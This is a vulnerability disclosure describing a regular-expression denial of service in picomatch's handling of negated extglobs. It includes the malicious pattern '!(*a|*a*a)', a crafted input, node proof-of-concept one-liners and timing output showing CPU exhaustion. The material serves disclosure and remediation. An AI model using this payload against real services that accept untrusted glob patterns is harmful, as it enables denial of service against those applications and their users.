## Summary
 
User-controlled negated extglob patterns in picomatch can compile into regular expressions with catastrophic backtracking, allowing unauthenticated attackers to trigger CPU exhaustion and event-loop blocking.
This results in a denial of service when applications pass untrusted glob patterns or candidate strings into `picomatch()` or `.isMatch()`.
 
---
 
## Details
 
The vulnerability originates from how negated extglobs (`!(...)`) are handled in the parser and regex generator.
 
* The library entrypoint:
  * `lib/picomatch.js` → `picomatch()` / `.isMatch()` / `.makeRe()`
* Pattern parsing:
  * `lib/parse.js`
* Execution sink:
  * `regex.exec(output)` in `picomatch.test()`
While the code contains logic to mitigate unsafe extglobs via `analyzeRepeatedExtglob()` (lib/parse.js), these protections are only applied to quantified extglobs like `+()` and `*()`.
The negated extglob branch:
 
* `lib/parse.js` (negation handling)
* emits nested negative lookahead regex constructs without applying the same safeguards
For example, the pattern:
 
```
!(*a|*a*a)
```
 
compiles to:
 
```
^(?:(?=.)(?:(?!(?:[^/]*?a|[^/]*?a[^/]*?a)$))[^/]*?)$
```
 
This structure introduces overlapping alternation inside a negative lookahead, causing exponential backtracking on near-matching inputs.
Because the resulting regex is executed against attacker-controlled input via:
 
```
regex.exec(output)
```
 
and no input length limits are enforced, this leads to CPU exhaustion.
 
---
 
## PoC
 
### Step 1 — Generate regex
 
```
node -e 'const pm=require("./"); console.log(pm.makeRe("!(*a|*a*a)").source)'
```
 
### Step 2 — Measure performance degradation
 
```
node -e 'const pm=require("./"); const {performance}=require("perf_hooks"); const is=pm("!(*a|*a*a)"); for (const n of [4096,8192,16384,32768,65536]) { const s="a".repeat(n)+"!"; const t0=performance.now(); is(s); console.log(n,(performance.now()-t0).toFixed(3)+"ms"); }'
```
 
**Observed results:**
 
```
4096   → ~18ms
8192   → ~72ms
16384  → ~289ms
32768  → ~1157ms
65536  → ~4629ms
```
 
### Control case:
 
```
node -e 'const pm=require("./"); const {performance}=require("perf_hooks"); const good=pm("!(*a)"); const bad=pm("!(*a|*a*a)"); for (const n of [4096,8192,16384,32768,65536]) { const s="a".repeat(n)+"!"; let t0=performance.now(); good(s); let t1=performance.now(); bad(s); let t2=performance.now(); console.log(JSON.stringify({n,good_ms:+(t1-t0).toFixed(3),bad_ms:+(t2-t1).toFixed(3)})); }'
```
 
**Observed:**
 
```
good_ms < 0.3ms
bad_ms  grows to ~4600ms
```
 
---
 
## Impact
 
* **Type:** Regular Expression Denial of Service (ReDoS)
* **CWE:** CWE-1333 (Inefficient Regular Expression Complexity)
* **Attack vector:** Remote (via user-controlled patterns or inputs)
* **Privileges required:** None
* **User interaction:** None
Any application that:
 
* accepts user-defined glob patterns, OR
* matches attacker-controlled input against stored patterns
is vulnerable to event-loop blocking and service degradation.
 
**Typical impact scenarios:**
 
* API latency spikes
* Node.js event loop starvation
* denial of service under minimal load

### My terminal output:

```bash
[keshavgoyal@hickory picomatch]$ node -e 'const pm=require("./"); console.log(pm.makeRe("!(*a|*a*a)").source)'
^(?:(?=.)(?:(?!(?:[^/]*?a|[^/]*?a[^/]*?a)$))[^/]*?)$
[keshavgoyal@hickory picomatch]$ node -e 'const pm=require("./"); const {performance}=require("perf_hooks"); const is=pm("!(*a|*a*a)"); for (const n of [4096,8192,16384,32768,65536]) { const s="a".repeat(n)+"!"; const t0=performance.now(); is(s); console.log(n,(performance.now()-t0).toFixed(3)+"ms"); }'
4096 18.371ms
8192 72.428ms
16384 289.358ms
32768 1157.161ms
65536 4629.619ms
[keshavgoyal@hickory picomatch]$ node -e 'const pm=require("./"); const {performance}=require("perf_hooks"); const good=pm("!(*a)"); const bad=pm("!(*a|*a*a)"); for (const n of [4096,8192,16384,32768,65536]) { const s="a".repeat(n)+"!"; let t0=performance.now(); good(s); let t1=performance.now(); bad(s); let t2=performance.now(); console.log(JSON.stringify({n,good_ms:+(t1-t0).toFixed(3),bad_ms:+(t2-t1).toFixed(3)})); }'
{"n":4096,"good_ms":0.211,"bad_ms":18.193}
{"n":8192,"good_ms":0.05,"bad_ms":72.428}
{"n":16384,"good_ms":0.075,"bad_ms":289.349}
{"n":32768,"good_ms":0.208,"bad_ms":1166.468}
{"n":65536,"good_ms":0.284,"bad_ms":4627.358}
```
